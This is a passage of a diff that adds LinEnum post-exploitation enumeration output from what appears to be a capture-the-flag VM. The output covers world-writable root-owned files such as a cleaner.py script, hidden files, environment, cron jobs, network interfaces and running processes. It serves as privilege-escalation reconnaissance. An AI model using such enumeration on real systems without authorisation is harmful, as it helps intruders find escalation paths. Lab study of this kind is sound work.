+drwxr-xr-x 21 root  root  4.0K Aug  9  2014 ..
+drwxr-xr-x  3 troll troll 4.0K Aug 13  2014 troll
+
+
+[-] Files not owned by user but writable by group:
+-rwxrwxrwx 1 troll root 8068 Aug 10  2014 /srv/ftp/lol.pcap
+-rwxrwxrwx 1 root root 34 Aug 13  2014 /var/tmp/cleaner.py.swp
+-rwxrwxrwx 1 root root 7296 Aug 11  2014 /var/www/html/sup3rs3cr3tdirlol/roflmao
+-rwxrwxrwx 1 root root 23 Aug 13  2014 /var/log/cronlog
+-rwxrwxrwx 1 root root 96 Aug 13  2014 /lib/log/cleaner.py
+
+
+[-] Files owned by our user:
+-rwxrwxr-x 1 overflow overflow 44413 Jul 15 15:22 /tmp/LinEnum.sh
+-rw-rw-r-- 1 overflow overflow 6938 Sep 16 14:49 /tmp/LinEnum.txt
+
+
+[-] Hidden files:
+-rw-r--r-- 1 root root 280 Jul 14  2014 /usr/src/linux-headers-3.13.0-32-generic/arch/x86/include/generated/uapi/asm/.unistd_64.h.cmd
+-rw-r--r-- 1 root root 300 Jul 14  2014 /usr/src/linux-headers-3.13.0-32-generic/arch/x86/include/generated/uapi/asm/.unistd_x32.h.cmd
+-rw-r--r-- 1 root root 275 Jul 14  2014 /usr/src/linux-headers-3.13.0-32-generic/arch/x86/include/generated/uapi/asm/.unistd_32.h.cmd
+-rw-r--r-- 1 root root 252 Jul 14  2014 /usr/src/linux-headers-3.13.0-32-generic/arch/x86/include/generated/asm/.syscalls_32.h.cmd
+-rw-r--r-- 1 root root 3299 Jul 14  2014 /usr/src/linux-headers-3.13.0-32-generic/arch/x86/tools/.relocs_64.o.cmd
+-rw-r--r-- 1 root root 3284 Jul 14  2014 /usr/src/linux-headers-3.13.0-32-generic/arch/x86/tools/.relocs_common.o.cmd
+-rw-r--r-- 1 root root 3299 Jul 14  2014 /usr/src/linux-headers-3.13.0-32-generic/arch/x86/tools/.relocs_32.o.cmd
+-rw-r--r-- 1 root root 146 Jul 14  2014 /usr/src/linux-headers-3.13.0-32-generic/arch/x86/tools/.relocs.cmd
+-rw-r--r-- 1 root root 46089 Jul 14  2014 /usr/src/linux-headers-3.13.0-32-generic/arch/x86/kernel/.asm-offsets.s.cmd
+-rw-r--r-- 1 root root 169704 Jul 14  2014 /usr/src/linux-headers-3.13.0-32-generic/.config
+-rw-r--r-- 1 root root 720 Jul 14  2014 /usr/src/linux-headers-3.13.0-32-generic/.missing-syscalls.d
+-rw-r--r-- 1 root root 169743 Jul 14  2014 /usr/src/linux-headers-3.13.0-32-generic/.config.old
+-rw-r--r-- 1 root root 12604 Jul 14  2014 /usr/src/linux-headers-3.13.0-32-generic/kernel/.bounds.s.cmd
+-rw-r--r-- 1 root root 4309 Jul 14  2014 /usr/src/linux-headers-3.13.0-32-generic/scripts/mod/.sumversion.o.cmd
+-rw-r--r-- 1 root root 1906 Jul 14  2014 /usr/src/linux-headers-3.13.0-32-generic/scripts/mod/.empty.o.cmd
+-rw-r--r-- 1 root root 2454 Jul 14  2014 /usr/src/linux-headers-3.13.0-32-generic/scripts/mod/.mk_elfconfig.cmd
+-rw-r--r-- 1 root root 4658 Jul 14  2014 /usr/src/linux-headers-3.13.0-32-generic/scripts/mod/.devicetable-offsets.s.cmd
+-rw-r--r-- 1 root root 539 Jul 14  2014 /usr/src/linux-headers-3.13.0-32-generic/scripts/mod/.devicetable-offsets.h.cmd
+-rw-r--r-- 1 root root 129 Jul 14  2014 /usr/src/linux-headers-3.13.0-32-generic/scripts/mod/.modpost.cmd
+-rw-r--r-- 1 root root 3368 Jul 14  2014 /usr/src/linux-headers-3.13.0-32-generic/scripts/mod/.file2alias.o.cmd
+-rw-r--r-- 1 root root 104 Jul 14  2014 /usr/src/linux-headers-3.13.0-32-generic/scripts/mod/.elfconfig.h.cmd
+-rw-r--r-- 1 root root 4424 Jul 14  2014 /usr/src/linux-headers-3.13.0-32-generic/scripts/mod/.modpost.o.cmd
+-rw-r--r-- 1 root root 3266 Jul 14  2014 /usr/src/linux-headers-3.13.0-32-generic/scripts/.recordmcount.cmd
+-rw-r--r-- 1 root root 2307 Jul 14  2014 /usr/src/linux-headers-3.13.0-32-generic/scripts/.conmakehash.cmd
+-rw-r--r-- 1 root root 3432 Jul 14  2014 /usr/src/linux-headers-3.13.0-32-generic/scripts/.sortextable.cmd
+-rw-r--r-- 1 root root 2296 Jul 14  2014 /usr/src/linux-headers-3.13.0-32-generic/scripts/.kallsyms.cmd
+-rw-r--r-- 1 root root 3250 Jul 14  2014 /usr/src/linux-headers-3.13.0-32-generic/scripts/genksyms/.lex.lex.o.cmd
+-rw-r--r-- 1 root root 2627 Jul 14  2014 /usr/src/linux-headers-3.13.0-32-generic/scripts/genksyms/.genksyms.o.cmd
+-rw-r--r-- 1 root root 153 Jul 14  2014 /usr/src/linux-headers-3.13.0-32-generic/scripts/genksyms/.genksyms.cmd
+-rw-r--r-- 1 root root 2402 Jul 14  2014 /usr/src/linux-headers-3.13.0-32-generic/scripts/genksyms/.parse.tab.o.cmd
+-rw-r--r-- 1 root root 4137 Jul 14  2014 /usr/src/linux-headers-3.13.0-32-generic/scripts/basic/.fixdep.cmd
+-rw-r--r-- 1 root root 3080 Jul 14  2014 /usr/src/linux-headers-3.13.0-32-generic/scripts/.asn1_compiler.cmd
+-rw-r--r-- 1 root root 4774 Jul 14  2014 /usr/src/linux-headers-3.13.0-32-generic/scripts/kconfig/.zconf.tab.o.cmd
+-rw-r--r-- 1 root root 3599 Jul 14  2014 /usr/src/linux-headers-3.13.0-32-generic/scripts/kconfig/.conf.o.cmd
+-rw-r--r-- 1 root root 110 Jul 14  2014 /usr/src/linux-headers-3.13.0-32-generic/scripts/kconfig/.conf.cmd
+-rw-r--r-- 1 root root 2737 Jul 14  2014 /usr/src/linux-headers-3.13.0-32-generic/scripts/selinux/mdp/.mdp.cmd
+-rw-r--r-- 1 root root 3133 Jul 14  2014 /usr/src/linux-headers-3.13.0-32-generic/scripts/selinux/genheaders/.genheaders.cmd
+-rw-r--r-- 1 root root 122 Jan 19  2014 /usr/src/linux-headers-3.13.0-32/scripts/.gitignore
+-rw-r--r-- 1 root root 56 Jan 19  2014 /usr/src/linux-headers-3.13.0-32/scripts/mod/.gitignore
+-rw-r--r-- 1 root root 42 Jan 19  2014 /usr/src/linux-headers-3.13.0-32/scripts/genksyms/.gitignore
+-rw-r--r-- 1 root root 7 Jan 19  2014 /usr/src/linux-headers-3.13.0-32/scripts/basic/.gitignore
+-rw-r--r-- 1 root root 167 Jan 19  2014 /usr/src/linux-headers-3.13.0-32/scripts/kconfig/.gitignore
+-rw-r--r-- 1 root root 31 Jan 19  2014 /usr/src/linux-headers-3.13.0-32/scripts/kconfig/lxdialog/.gitignore
+-rw-r--r-- 1 root root 55 Jan 19  2014 /usr/src/linux-headers-3.13.0-32/scripts/dtc/.gitignore
+-rw-r--r-- 1 root root 21 Jan 19  2014 /usr/src/linux-headers-3.13.0-32/scripts/selinux/mdp/.gitignore
+-rw-r--r-- 1 root root 11 Jan 19  2014 /usr/src/linux-headers-3.13.0-32/scripts/selinux/genheaders/.gitignore
+-rw-r--r-- 1 root root 0 Sep 16 14:32 /run/network/.ifstate.lock
+-rw-r--r-- 1 root root 1332 Aug  9  2014 /etc/apparmor.d/cache/.features
+-rw-r--r-- 1 root root 0 Jul 22  2014 /etc/init.d/.legacy-bootordering
+-rw-r--r-- 1 root root 102 Feb  8  2013 /etc/cron.d/.placeholder
+-rw-r--r-- 1 root root 102 Feb  8  2013 /etc/cron.hourly/.placeholder
+-rw-r--r-- 1 root root 102 Feb  8  2013 /etc/cron.monthly/.placeholder
+-rw-r--r-- 1 root root 102 Feb  8  2013 /etc/cron.daily/.placeholder
+-rw-r--r-- 1 root root 220 Apr  8  2014 /etc/skel/.bash_logout
+-rw-r--r-- 1 root root 3637 Apr  8  2014 /etc/skel/.bashrc
+-rw-r--r-- 1 root root 675 Apr  8  2014 /etc/skel/.profile
+-rw------- 1 root root 0 Jul 22  2014 /etc/.pwd.lock
+-rw-r--r-- 1 root root 102 Feb  8  2013 /etc/cron.weekly/.placeholder
+-rw-r--r-- 1 troll troll 675 Aug  9  2014 /home/troll/.profile
+-rw------- 1 troll troll 0 Aug 13  2014 /home/troll/.bash_history
+-rw------- 1 troll troll 976 Aug  9  2014 /home/troll/.viminfo
+
+
+[-] World-readable files within /home:
+-rw-r--r-- 1 troll troll 675 Aug  9  2014 /home/troll/.profile
+
+
+### ENVIRONMENTAL #######################################
+[-] Environment information:
+XDG_SESSION_ID=2
+SHELL=/bin/sh
+TERM=xterm-256color
+SSH_CLIENT=192.168.1.8 52178 22
+SSH_TTY=/dev/pts/0
+USER=overflow
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
+MAIL=/var/mail/overflow
+PWD=/tmp
+LANG=en_US.UTF-8
+SHLVL=1
+HOME=/home/overflow
+LANGUAGE=en_US:
+LOGNAME=overflow
+SSH_CONNECTION=192.168.1.8 52178 192.168.1.23 22
+XDG_RUNTIME_DIR=/run/user/1002
+_=/usr/bin/env
+
+
+[-] Path information:
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
+
+
+[-] Available shells:
+# /etc/shells: valid login shells
+/bin/sh
+/bin/dash
+/bin/bash
+/bin/rbash
+
+
+[-] Current umask value:
+0002
+u=rwx,g=rwx,o=rx
+
+
+[-] umask value as specified in /etc/login.defs:
+UMASK		022
+
+
+[-] Password and storage information:
+PASS_MAX_DAYS	99999
+PASS_MIN_DAYS	0
+PASS_WARN_AGE	7
+ENCRYPT_METHOD SHA512
+
+
+### JOBS/TASKS ##########################################
+[-] Cron jobs:
+-rw------- 1 root root  722 Feb  8  2013 /etc/crontab
+
+/etc/cron.d:
+total 12
+drwxr-xr-x  2 root root 4096 Aug  9  2014 .
+drwxr-xr-x 86 root root 4096 Sep 16 14:32 ..
+-rw-r--r--  1 root root  102 Feb  8  2013 .placeholder
+
+/etc/cron.daily:
+total 68
+drwxr-xr-x  2 root root  4096 Aug  9  2014 .
+drwxr-xr-x 86 root root  4096 Sep 16 14:32 ..
+-rwxr-xr-x  1 root root   625 Jul 22  2014 apache2
+-rwxr-xr-x  1 root root 15481 Apr 10  2014 apt
+-rwxr-xr-x  1 root root   314 Feb 17  2014 aptitude
+-rwxr-xr-x  1 root root   355 Jun  4  2013 bsdmainutils
+-rwxr-xr-x  1 root root   256 Mar  7  2014 dpkg
+-rwxr-xr-x  1 root root   372 Jan 22  2014 logrotate
+-rwxr-xr-x  1 root root  1261 Apr 10  2014 man-db
+-rwxr-xr-x  1 root root   435 Jun 20  2013 mlocate
+-rwxr-xr-x  1 root root   249 Feb 16  2014 passwd
+-rw-r--r--  1 root root   102 Feb  8  2013 .placeholder
+-rwxr-xr-x  1 root root  2417 May 13  2013 popularity-contest
+-rwxr-xr-x  1 root root   328 Jul 18  2014 upstart
+
+/etc/cron.hourly:
+total 12
+drwxr-xr-x  2 root root 4096 Aug 10  2014 .
+drwxr-xr-x 86 root root 4096 Sep 16 14:32 ..
+-rw-r--r--  1 root root  102 Feb  8  2013 .placeholder
+
+/etc/cron.monthly:
+total 12
+drwxr-xr-x  2 root root 4096 Aug  9  2014 .
+drwxr-xr-x 86 root root 4096 Sep 16 14:32 ..
+-rw-r--r--  1 root root  102 Feb  8  2013 .placeholder
+
+/etc/cron.weekly:
+total 24
+drwxr-xr-x  2 root root 4096 Aug  9  2014 .
+drwxr-xr-x 86 root root 4096 Sep 16 14:32 ..
+-rwxr-xr-x  1 root root  730 Feb 23  2014 apt-xapian-index
+-rwxr-xr-x  1 root root  427 Apr 16  2014 fstrim
+-rwxr-xr-x  1 root root  771 Apr 10  2014 man-db
+-rw-r--r--  1 root root  102 Feb  8  2013 .placeholder
+
+
+### NETWORKING  ##########################################
+[-] Network and IP info:
+eth0      Link encap:Ethernet  HWaddr 08:00:27:f9:8d:be  
+          inet addr:192.168.1.23  Bcast:192.168.1.255  Mask:255.255.255.0
+          inet6 addr: 2a01:e35:1394:b540:a00:27ff:fef9:8dbe/64 Scope:Global
+          inet6 addr: fe80::a00:27ff:fef9:8dbe/64 Scope:Link
+          inet6 addr: 2a01:e35:1394:b540:5412:430a:712a:4252/64 Scope:Global
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:1443 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:1025 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:226083 (226.0 KB)  TX bytes:148465 (148.4 KB)
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          inet6 addr: ::1/128 Scope:Host
+          UP LOOPBACK RUNNING  MTU:65536  Metric:1
+          RX packets:16 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:16 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:1184 (1.1 KB)  TX bytes:1184 (1.1 KB)
+
+
+[-] ARP history:
+? (192.168.1.254) at 68:a3:78:8b:0c:dd [ether] on eth0
+? (192.168.1.8) at 08:00:27:ca:e8:b7 [ether] on eth0
+
+
+[-] Nameserver(s):
+nameserver 192.168.1.254
+
+
+[-] Default route:
+default         192.168.1.254   0.0.0.0         UG    0      0        0 eth0
+
+
+[-] Listening TCP:
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        0      0 0.0.0.0:21              0.0.0.0:*               LISTEN      -               
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
+tcp        0      0 192.168.1.23:22         192.168.1.8:52178       ESTABLISHED -               
+tcp6       0      0 :::22                   :::*                    LISTEN      -               
+tcp6       0      0 :::80                   :::*                    LISTEN      -               
+
+
+[-] Listening UDP:
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+udp        0      0 0.0.0.0:36919           0.0.0.0:*                           -               
+udp        0      0 0.0.0.0:68              0.0.0.0:*                           -               
+udp6       0      0 :::45436                :::*                                -               
+
+
+### SERVICES #############################################
+[-] Running processes:
+USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root         1  0.0  0.2   4196  2244 ?        Ss   14:32   0:00 /sbin/init
+root         2  0.0  0.0      0     0 ?        S    14:32   0:00 [kthreadd]
+root         3  0.0  0.0      0     0 ?        S    14:32   0:00 [ksoftirqd/0]
+root         4  0.0  0.0      0     0 ?        S    14:32   0:00 [kworker/0:0]
+root         5  0.0  0.0      0     0 ?        S<   14:32   0:00 [kworker/0:0H]
+root         6  0.0  0.0      0     0 ?        S    14:32   0:00 [kworker/u2:0]
+root         7  0.0  0.0      0     0 ?        S    14:32   0:00 [rcu_sched]
+root         8  0.0  0.0      0     0 ?        S    14:32   0:00 [rcu_bh]
+root         9  0.0  0.0      0     0 ?        S    14:32   0:00 [migration/0]
+root        10  0.0  0.0      0     0 ?        S    14:32   0:00 [watchdog/0]
+root        11  0.0  0.0      0     0 ?        S<   14:32   0:00 [khelper]
+root        12  0.0  0.0      0     0 ?        S    14:32   0:00 [kdevtmpfs]
+root        13  0.0  0.0      0     0 ?        S<   14:32   0:00 [netns]
+root        14  0.0  0.0      0     0 ?        S<   14:32   0:00 [writeback]
+root        15  0.0  0.0      0     0 ?        S<   14:32   0:00 [kintegrityd]
+root        16  0.0  0.0      0     0 ?        S<   14:32   0:00 [bioset]
+root        17  0.0  0.0      0     0 ?        S<   14:32   0:00 [kworker/u3:0]
+root        18  0.0  0.0      0     0 ?        S<   14:32   0:00 [kblockd]
+root        19  0.0  0.0      0     0 ?        S<   14:32   0:00 [ata_sff]
+root        20  0.0  0.0      0     0 ?        S    14:32   0:00 [khubd]
+root        21  0.0  0.0      0     0 ?        S<   14:32   0:00 [md]
+root        22  0.0  0.0      0     0 ?        S<   14:32   0:00 [devfreq_wq]
+root        23  0.0  0.0      0     0 ?        S    14:32   0:00 [kworker/0:1]
+root        25  0.0  0.0      0     0 ?        S    14:32   0:00 [khungtaskd]
+root        26  0.0  0.0      0     0 ?        S    14:32   0:00 [kswapd0]
+root        27  0.0  0.0      0     0 ?        SN   14:32   0:00 [ksmd]
+root        28  0.0  0.0      0     0 ?        SN   14:32   0:00 [khugepaged]
+root        29  0.0  0.0      0     0 ?        S    14:32   0:00 [fsnotify_mark]
+root        30  0.0  0.0      0     0 ?        S    14:32   0:00 [ecryptfs-kthrea]
+root        31  0.0  0.0      0     0 ?        S<   14:32   0:00 [crypto]
+root        43  0.0  0.0      0     0 ?        S<   14:32   0:00 [kthrotld]
+root        46  0.0  0.0      0     0 ?        S    14:32   0:00 [scsi_eh_0]
+root        47  0.0  0.0      0     0 ?        S    14:32   0:00 [scsi_eh_1]
+root        69  0.0  0.0      0     0 ?        S<   14:32   0:00 [deferwq]
+root        70  0.0  0.0      0     0 ?        S<   14:32   0:00 [charger_manager]
+root       122  0.0  0.0      0     0 ?        S<   14:32   0:00 [kpsmoused]
+root       123  0.0  0.0      0     0 ?        S<   14:32   0:00 [kworker/u3:1]
+root       124  0.0  0.0      0     0 ?        S    14:32   0:00 [scsi_eh_2]
+root       134  0.0  0.0      0     0 ?        S    14:32   0:00 [jbd2/sda1-8]
+root       135  0.0  0.0      0     0 ?        S<   14:32   0:00 [ext4-rsv-conver]
+root       263  0.0  0.0   3016   616 ?        S    14:32   0:00 upstart-udev-bridge --daemon
+root       267  0.0  0.1  12144  1516 ?        Ss   14:32   0:00 /lib/systemd/systemd-udevd --daemon
+message+   336  0.0  0.0   4236   972 ?        Ss   14:32   0:00 dbus-daemon --system --fork
+root       363  0.0  0.1   4220  1704 ?        Ss   14:32   0:00 /lib/systemd/systemd-logind
+syslog     383  0.0  0.1  30596  1164 ?        Ssl  14:32   0:00 rsyslogd
+root       394  0.0  0.0   2888   596 ?        S    14:32   0:00 upstart-file-bridge --daemon
+root       491  0.0  0.0   2876   600 ?        S    14:32   0:00 upstart-socket-bridge --daemon
+root       612  0.0  0.1   5520  1852 ?        Ss   14:33   0:00 dhclient -1 -v -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases eth0
+root       660  0.0  0.0   4784   956 ?        Ss   14:33   0:00 /usr/sbin/vsftpd
+root       751  0.0  0.0   4652   840 tty4     Ss+  14:33   0:00 /sbin/getty -8 38400 tty4
+root       754  0.0  0.0   4652   844 tty5     Ss+  14:33   0:00 /sbin/getty -8 38400 tty5
+root       757  0.0  0.0   4652   852 tty2     Ss+  14:33   0:00 /sbin/getty -8 38400 tty2
+root       758  0.0  0.0   4652   852 tty3     Ss+  14:33   0:00 /sbin/getty -8 38400 tty3
+root       760  0.0  0.0   4652   840 tty6     Ss+  14:33   0:00 /sbin/getty -8 38400 tty6
+root       783  0.0  0.2   7800  2512 ?        Ss   14:33   0:00 /usr/sbin/sshd -D
+root       787  0.0  0.0   3060   824 ?        Ss   14:33   0:00 cron
+root       860  0.0  0.2   5616  2536 ?        Ss   14:33   0:00 /usr/sbin/apache2 -k start
+www-data   863  0.0  0.4 229384  4528 ?        Sl   14:33   0:00 /usr/sbin/apache2 -k start
+www-data   864  0.0  0.4 229432  4568 ?        Sl   14:33   0:00 /usr/sbin/apache2 -k start
+root       967  0.0  0.6  38660  6988 ?        Sl   14:33   0:00 /usr/bin/python /usr/bin/fail2ban-server -b -s /var/run/fail2ban/fail2ban.sock -p /var/run/fail2ban/fail2ban.pid
+root      1037  0.0  0.0      0     0 ?        S    14:33   0:00 [kauditd]
+root      1098  0.0  0.0   4652   836 tty1     Ss+  14:35   0:00 /sbin/getty -8 38400 tty1
+root      1179  0.0  0.0      0     0 ?        S    14:43   0:00 [kworker/u2:2]
+root      1198  0.0  0.3  11200  3592 ?        Ss   14:47   0:00 sshd: overflow [priv]
+overflow  1216  0.0  0.1  11200  1688 ?        S    14:47   0:00 sshd: overflow@pts/0
+overflow  1217  0.0  0.0   2272   624 pts/0    Ss   14:47   0:00 -sh
+overflow  1237  0.0  0.2   6036  2092 pts/0    S+   14:49   0:00 /bin/bash ./LinEnum.sh -t
+overflow  1238  0.1  0.1   6132  1740 pts/0    S+   14:49   0:00 /bin/bash ./LinEnum.sh -t
+overflow  1239  0.0  0.0   4232   580 pts/0    S+   14:49   0:00 tee -a
+root      1507  0.0  0.0  12140   760 ?        S    14:49   0:00 /lib/systemd/systemd-udevd --daemon
+overflow  1514  0.0  0.1   6132  1424 pts/0    S+   14:49   0:00 /bin/bash ./LinEnum.sh -t
+overflow  1515  0.0  0.1   5224  1156 pts/0    R+   14:49   0:00 ps aux
+
+
+[-] Process binaries and associated permissions (from above list):
+964K -rwxr-xr-x 1 root root 964K Apr 23  2014 /bin/bash
+256K -rwxr-xr-x 1 root root 254K Jun 19  2014 /lib/systemd/systemd-logind
+232K -rwxr-xr-x 1 root root 230K Jun 19  2014 /lib/systemd/systemd-udevd
+ 28K -rwxr-xr-x 2 root root  27K Jun  3  2014 /sbin/getty
+248K -rwxr-xr-x 1 root root 247K Jul 18  2014 /sbin/init
+   0 lrwxrwxrwx 1 root root    9 Dec 21  2013 /usr/bin/python -> python2.7
+568K -rwxr-xr-x 1 root root 568K Jul 22  2014 /usr/sbin/apache2
+812K -rwxr-xr-x 1 root root 812K May 12  2014 /usr/sbin/sshd
+168K -rwxr-xr-x 1 root root 167K May  1  2014 /usr/sbin/vsftpd
+
+
+[-] /etc/init.d/ binary permissions:
+total 180
+drwxr-xr-x  2 root root 4096 Aug 10  2014 .
+drwxr-xr-x 86 root root 4096 Sep 16 14:32 ..
+-rwxr-xr-x  1 root root 9974 Jan  7  2014 apache2
+-rwxr-xr-x  1 root root 4596 Mar 27  2014 apparmor
+-rwxr-xr-x  1 root root 1919 Jan 18  2011 console-setup
+lrwxrwxrwx  1 root root   21 Aug  9  2014 cron -> /lib/init/upstart-job
+-rwxr-xr-x  1 root root 2832 Nov 11  2013 dbus
+-rwxr-xr-x  1 root root 1217 Mar  7  2013 dns-clean
+-rwxr-xr-x  1 root root 6383 Nov 17  2013 fail2ban
+lrwxrwxrwx  1 root root   21 Mar 14  2012 friendly-recovery -> /lib/init/upstart-job
+-rwxr-xr-x  1 root root 1105 May  8  2014 grub-common
+-rwxr-xr-x  1 root root 1329 Mar 12  2014 halt
+-rwxr-xr-x  1 root root 1864 Nov 12  2012 irqbalance
+-rwxr-xr-x  1 root root 1293 Mar 12  2014 killprocs
+-rwxr-xr-x  1 root root 1990 Jan 22  2013 kmod
+-rw-r--r--  1 root root    0 Jul 22  2014 .legacy-bootordering
+-rwxr-xr-x  1 root root 4479 Mar 20  2014 networking
+-rwxr-xr-x  1 root root 1292 Mar 12  2014 ondemand
+-rwxr-xr-x  1 root root 1466 Mar 11  2014 open-vm-tools
+-rwxr-xr-x  1 root root  561 Jan 22  2013 pppd-dns
+-rwxr-xr-x  1 root root 1192 May 27  2013 procps
+-rwxr-xr-x  1 root root 6120 Mar 12  2014 rc
+-rwxr-xr-x  1 root root  782 Mar 12  2014 rc.local
+-rwxr-xr-x  1 root root  117 Mar 12  2014 rcS
+-rw-r--r--  1 root root 2427 Mar 12  2014 README
+-rwxr-xr-x  1 root root  639 Mar 12  2014 reboot
+-rwxr-xr-x  1 root root 2918 Jun 13  2014 resolvconf
+-rwxr-xr-x  1 root root 4395 Apr 17  2014 rsync
+-rwxr-xr-x  1 root root 2913 Dec  4  2013 rsyslog
+-rwxr-xr-x  1 root root 3920 Mar 12  2014 sendsigs
+-rwxr-xr-x  1 root root  590 Mar 12  2014 single
+-rw-r--r--  1 root root 4290 Mar 12  2014 skeleton
+-rwxr-xr-x  1 root root 4077 May  2  2014 ssh
+-rwxr-xr-x  1 root root  731 Feb  4  2014 sudo
+-rwxr-xr-x  1 root root 6173 Apr 13  2014 udev
+-rwxr-xr-x  1 root root 2721 Mar 12  2014 umountfs
+-rwxr-xr-x  1 root root 2260 Mar 12  2014 umountnfs.sh
+-rwxr-xr-x  1 root root 1872 Mar 12  2014 umountroot
+-rwxr-xr-x  1 root root 3111 Mar 12  2014 urandom
+
+
+[-] /etc/init/ config file permissions:
+total 332
+drwxr-xr-x  2 root root 4096 Aug  9  2014 .
+drwxr-xr-x 86 root root 4096 Sep 16 14:32 ..
+-rw-r--r--  1 root root  328 Feb 21  2014 bootmisc.sh.conf
+-rw-r--r--  1 root root  232 Feb 21  2014 checkfs.sh.conf
+-rw-r--r--  1 root root  253 Feb 21  2014 checkroot-bootclean.sh.conf
+-rw-r--r--  1 root root  307 Feb 21  2014 checkroot.sh.conf
+-rw-r--r--  1 root root  266 Apr 11  2014 console.conf
+-rw-r--r--  1 root root  250 Oct  8  2012 console-font.conf
+-rw-r--r--  1 root root  509 Dec 21  2010 console-setup.conf
+-rw-r--r--  1 root root 1122 Apr 11  2014 container-detect.conf
+-rw-r--r--  1 root root  356 Apr 11  2014 control-alt-delete.conf
+-rw-r--r--  1 root root  297 Feb  8  2013 cron.conf
+-rw-r--r--  1 root root  489 Nov 11  2013 dbus.conf
+-rw-r--r--  1 root root  273 Nov 19  2010 dmesg.conf
+-rw-r--r--  1 root root 1377 Apr 11  2014 failsafe.conf
+-rw-r--r--  1 root root  267 Apr 11  2014 flush-early-job-log.conf
+-rw-r--r--  1 root root 1247 Mar 14  2012 friendly-recovery.conf
+-rw-r--r--  1 root root  284 Jul 23  2013 hostname.conf
+-rw-r--r--  1 root root  557 Apr 16  2014 hwclock.conf
+-rw-r--r--  1 root root  444 Apr 16  2014 hwclock-save.conf
+-rw-r--r--  1 root root  571 Apr 19  2012 irqbalance.conf
+-rw-r--r--  1 root root  689 Apr 10  2014 kmod.conf
+-rw-r--r--  1 root root  268 Feb 21  2014 mountall-bootclean.sh.conf
+-rw-r--r--  1 root root 1232 Feb 21  2014 mountall.conf
+-rw-r--r--  1 root root  349 Feb 21  2014 mountall-net.conf
+-rw-r--r--  1 root root  261 Feb 21  2014 mountall-reboot.conf
+-rw-r--r--  1 root root  311 Feb 21  2014 mountall.sh.conf
+-rw-r--r--  1 root root 1201 Feb 21  2014 mountall-shell.conf
+-rw-r--r--  1 root root  327 Feb 21  2014 mountdevsubfs.sh.conf
+-rw-r--r--  1 root root  405 Feb 21  2014 mounted-debugfs.conf
+-rw-r--r--  1 root root  730 Feb 21  2014 mounted-dev.conf
+-rw-r--r--  1 root root  480 Feb 21  2014 mounted-proc.conf
+-rw-r--r--  1 root root  618 Feb 21  2014 mounted-run.conf
+-rw-r--r--  1 root root 1890 Feb 21  2014 mounted-tmp.conf
+-rw-r--r--  1 root root  903 Feb 21  2014 mounted-var.conf
+-rw-r--r--  1 root root  323 Feb 21  2014 mountkernfs.sh.conf
+-rw-r--r--  1 root root  249 Feb 21  2014 mountnfs-bootclean.sh.conf
+-rw-r--r--  1 root root  313 Feb 21  2014 mountnfs.sh.conf
+-rw-r--r--  1 root root  238 Feb 21  2014 mtab.sh.conf
+-rw-r--r--  1 root root 2493 Mar 20  2014 networking.conf
+-rw-r--r--  1 root root 1109 May  8  2014 network-interface.conf
+-rw-r--r--  1 root root  530 Mar 20  2014 network-interface-container.conf
+-rw-r--r--  1 root root 1756 May  4  2013 network-interface-security.conf
+-rw-r--r--  1 root root  534 Feb 16  2014 passwd.conf
+-rw-r--r--  1 root root  519 Mar 13  2014 plymouth.conf
+-rw-r--r--  1 root root  326 Mar 13  2014 plymouth-log.conf
+-rw-r--r--  1 root root  675 Mar 13  2014 plymouth-ready.conf
+-rw-r--r--  1 root root  778 Mar 13  2014 plymouth-shutdown.conf
+-rw-r--r--  1 root root  899 Mar 13  2014 plymouth-splash.conf
+-rw-r--r--  1 root root  796 Mar 13  2014 plymouth-stop.conf
+-rw-r--r--  1 root root  421 Apr 11  2014 plymouth-upstart-bridge.conf
+-rw-r--r--  1 root root  363 Jan  6  2014 procps.conf
+-rw-r--r--  1 root root  661 Apr 11  2014 rc.conf
+-rw-r--r--  1 root root  683 Apr 11  2014 rcS.conf
+-rw-r--r--  1 root root 1543 Apr 11  2014 rc-sysinit.conf
+-rw-r--r--  1 root root  457 Dec 13  2012 resolvconf.conf
+-rw-r--r--  1 root root  426 Apr 18  2013 rsyslog.conf
+-rw-r--r--  1 root root  230 Mar 18  2011 setvtrgb.conf
+-rw-r--r--  1 root root  277 Apr 11  2014 shutdown.conf
+-rw-r--r--  1 root root  641 May  2  2014 ssh.conf
+-rw-r--r--  1 root root  711 Mar 12  2014 startpar-bridge.conf
+-rw-r--r--  1 root root 1171 May  7  2014 systemd-logind.conf
+-rw-r--r--  1 root root  348 Apr 11  2014 tty1.conf
+-rw-r--r--  1 root root  333 Apr 11  2014 tty2.conf
+-rw-r--r--  1 root root  333 Apr 11  2014 tty3.conf
+-rw-r--r--  1 root root  333 Apr 11  2014 tty4.conf
+-rw-r--r--  1 root root  232 Apr 11  2014 tty5.conf
+-rw-r--r--  1 root root  232 Apr 11  2014 tty6.conf
+-rw-r--r--  1 root root  337 Apr 13  2014 udev.conf
+-rw-r--r--  1 root root  637 Apr 13  2014 udev-fallback-graphics.conf
+-rw-r--r--  1 root root  768 Apr 13  2014 udev-finish.conf
+-rw-r--r--  1 root root  356 Apr 13  2014 udevmonitor.conf
+-rw-r--r--  1 root root  352 Apr 13  2014 udevtrigger.conf
+-rw-r--r--  1 root root  473 Feb 28  2014 ufw.conf
+-rw-r--r--  1 root root  412 Apr 11  2014 upstart-file-bridge.conf
+-rw-r--r--  1 root root  329 Apr 11  2014 upstart-socket-bridge.conf
+-rw-r--r--  1 root root  553 Apr 11  2014 upstart-udev-bridge.conf
